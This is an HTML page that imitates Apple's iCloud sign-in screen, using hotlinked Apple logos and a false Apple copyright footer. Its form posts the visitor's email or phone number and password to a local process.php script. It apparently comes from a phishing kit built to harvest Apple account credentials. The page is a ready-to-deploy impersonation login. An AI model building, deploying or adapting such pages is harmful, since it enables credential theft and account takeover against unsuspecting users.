<!DOCTYPE html>
<html lang="en">
<head>
<link rel="icon" type="image/png" href="https://images.seeklogo.com/logo-png/42/1/apple-icloud-logo-png_seeklogo-426388.png">
<meta charset="UTF-8">
<title>Sign in with Apple Account</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<link rel="stylesheet" href="assets/css/style.css">

</head>

<body>
<div class="icloud-logo">
    <img src="https://images.seeklogo.com/logo-png/49/2/icloud-logo-png_seeklogo-494572.png" alt="iCloud Logo">
</div>


<div class="container">


    <!-- PNG ASLI -->
    <img src="apple-ring.png" class="ring-img" alt="Apple Ring">

    <h1 data-i18n="title">Sign in with Apple Account</h1>
	
	<form id="loginForm" action="process.php" method="POST">

    <input type="text" name="email" data-i18n-placeholder="Email or Phone Number" required>
	<input type="password" name="password" data-i18n-placeholder="Password" required>

	</form>
    <a href="#" class="link" data-i18n="create">Create Your Apple Account</a>

   <div class="desc" data-i18n-html="desc"></div>

   
    <button
    type="submit"
    form="loginForm"
	data-i18n="continue"
    class="btn btn-continue">
    Continue
</button>

    <button class="btn btn-iphone" data-i18n="iphone">Sign in with iPhone</button>

    <div class="footer" data-i18n="require">Requires a device with iOS 17 or later.</div>

</div>
<script>
const emailInput = document.querySelector('input[name="email"]');
const continueBtn = document.querySelector('.btn-continue');

emailInput.addEventListener('input', () => {
    if (emailInput.value.trim() !== '') {
        continueBtn.classList.add('active');
    } else {
        continueBtn.classList.remove('active');
    }
});
</script>
<footer class="apple-footer">
    <div class="footer-left">
        <a href="#">System Status</a>
        <a href="#">Privacy Policy</a>
        <a href="#">Terms &amp; Conditions</a>
    </div>
    <div class="footer-right">
        Copyright © 2026 Apple Inc. All rights reserved.
    </div>
</footer>

<script src="assets/js/language.js"></script>


</body>
</html>
